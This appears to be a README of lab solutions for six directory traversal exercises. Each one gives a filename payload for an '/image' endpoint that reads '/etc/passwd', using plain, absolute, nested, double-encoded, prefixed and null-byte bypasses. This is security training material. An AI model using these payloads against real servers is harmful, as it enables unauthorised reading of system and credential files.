<div align='center'>

# **Directory Traversal**

</div>

## **Lab 1:** File path traversal, simple case

**Solution:** Go to endpoint '/image?filename=../../../../../../../../../../etc/passwd' to read the content of the file

**Solution script:** [Lab1.py](./Lab1.py)

## **Lab 2:** File path traversal, traversal sequences blocked with absolute path bypass

**Solution:** Go to endpoint '/image?filename=/etc/passwd' to read the content of the file

**Solution script:** [Lab2.py](./Lab2.py)

## **Lab 3:** File path traversal, traversal sequences stripped non-recursively

**Solution:** Go to endpoint '/image?filename=....//....//....//....//....//....//....//....//....//....//etc/passwd' to read the content of the file

**Solution script:** [Lab3.py](./Lab3.py)

## **Lab 4:** File path traversal, traversal sequences stripped with superfluous URL-decode

**Solution:** Go to endpoint '/image?filename=../../../../../../../../../../etc/passwd' (the value of the filename parameter have to be URL Encoded two times) to read the content of the file

**Solution script:** [Lab4.py](./Lab4.py)

## **Lab 5:** File path traversal, validation of start of path

**Solution:** Go to endpoint '/image?filename=/var/www/images/../../../etc/passwd' to read the content of the file

**Solution script:** [Lab5.py](./Lab5.py)

## **Lab 6:** File path traversal, validation of file extension with null byte bypass

**Solution:** Go to endpoint '/image?filename=../../../etc/passwd%00.png' to read the content of the file

**Solution script:** [Lab6.py](./Lab6.py)